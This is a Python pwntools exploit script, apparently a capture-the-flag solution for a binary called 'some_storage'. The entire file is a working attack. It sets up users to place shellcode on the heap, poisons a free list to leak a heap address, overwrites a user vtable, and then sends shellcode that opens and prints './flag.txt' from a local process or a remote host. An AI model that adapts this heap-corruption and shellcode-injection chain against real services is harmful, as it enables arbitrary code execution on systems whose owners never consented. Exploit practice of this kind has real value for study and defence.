#!/usr/bin/env python3
import sys
from pwn import *

context.binary = exe = ELF('./some_storage')

if args.LOCAL:
    context.terminal = ['tmux','splitw','-h','-p','80']
    io = process([exe.path])
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

def cmd(c):
    io.sendlineafter(b'> ', str(c).encode())

def reg(name):
    cmd(2) ; io.sendlineafter(b': ', name)

def login(name):
    cmd(1) ; io.sendlineafter(b': ', name)

def logout():
    cmd(1)

def add(task):
    cmd(3) ; io.sendlineafter(b': ', task)

def delete(id):
    cmd(4) ; io.sendlineafter(b': ', str(id).encode())

def edit(name):
    cmd(5) ; io.sendlineafter(b': ', name)


reg(b'0')
reg(b'1')
reg(b'2') # user with shellcode
login(b'2')
for i in range(8): add(b'a')
add(asm(shellcraft.read(0, 'rdx', 0x100)))
logout()
reg(b'3')
reg(b'4')
reg(b'5')
reg(b'6'*0x10)
reg(b'7')

login(b'5')
add(b'a') ; add(b'b') ; add(b'c') ; add(b'd')
edit(b'5'*0x18)     # rewrite `free_list`

add(b'\x00')        # put heap address in user.name
logout() ; cmd(3)
io.recvuntil(b'6'*0x10)
heap = unpack(io.recvline()[:-1], 'all')
print('[+] heap: ', hex(heap))

login(b'5'*0x18)
delete(0)
add(b'a'*8+p64(heap-0x100-0x30))    # rewrite free list to user.vtable
delete(0)

logout() ; login(b'6'*0x10)
if args.LOCAL: gdb.attach(io, 'b *main+626\nc\nsi\nhexdump *(long*)&users 0x100')
add(p64(heap-0x200+8))  # rewrite vtable

sleep(0.3)
io.send(b'a'*0xd + asm(shellcraft.open('./flag.txt',0)+shellcraft.read('rax','rbp',0x30)+shellcraft.write(1,'rbp',0x30)+shellcraft.exit(0)))

io.interactive()
